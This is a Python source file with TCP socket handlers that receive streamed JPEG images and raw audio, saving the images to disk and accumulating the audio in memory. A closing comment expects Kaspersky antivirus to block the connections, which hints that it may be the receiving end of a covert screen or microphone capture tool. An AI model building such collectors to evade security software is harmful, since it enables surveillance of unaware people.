import os, os.path
from socketserver import StreamRequestHandler
from traceback import format_tb
import wave

import numpy as np
import soundfile as sf

iTime = aTime = 0
dTemp = os.path.join(os.path.dirname(__file__), "mem", "tmp")
aTemp = "audio.wav"
audio = None
sample_rate = 0


class ImageHandler(StreamRequestHandler):
    def handle(self):
        try:
            package = self.request.recv(1073741824)  # 1GB (maximum bytes downloadable)
            if str(package) == "b''" or str(package) == "b'0000000000'": return
            data_size = int(package[:10].strip(b'0'))
            data = package[10:]
            while len(data) < data_size:
                package = self.request.recv(1073741824)
                if not package: break
                data += package
            global dTemp, iTime
            with open(dTemp + str(iTime) + ".jpg", "wb") as f:
                f.write(data)
            iTime += 1
        except Exception as e:
            print(str(e.__class__)[8:-2] + ": " + str(e) + "\n" + ''.join(format_tb(e.__traceback__)))


class AudioHandler(StreamRequestHandler):
    def handle(self):
        try:
            package = self.request.recv(1073741824)  # 1GB (maximum bytes downloadable)
            if str(package) == "b''" or str(package) == "b'0000000000'": return
            data_size = int(package[:10].strip(b'0'))
            data = package[10:]
            while len(data) < data_size:
                package = self.request.recv(1073741824)
                if not package: break
                data += package
            global audio, sample_rate, aTime, dTemp
            last_time = str(aTime)
            wTemp = dTemp + last_time + ".wav"
            with wave.open(wTemp, 'wb') as f:
                f.setparams((1, 2, 44100, 0, 'NONE', 'NONE'))
                f.writeframesraw(data)
            arr, sample_rate = sf.read(wTemp)
            audio = np.concatenate((audio, arr)) if audio is not None else arr
            del arr
            os.remove(wTemp)
        except Exception as e:
            print(str(e.__class__)[8:-2] + ": " + str(e) + "\n" + ''.join(format_tb(e.__traceback__)))

# Kaspersky will try to block these connections!
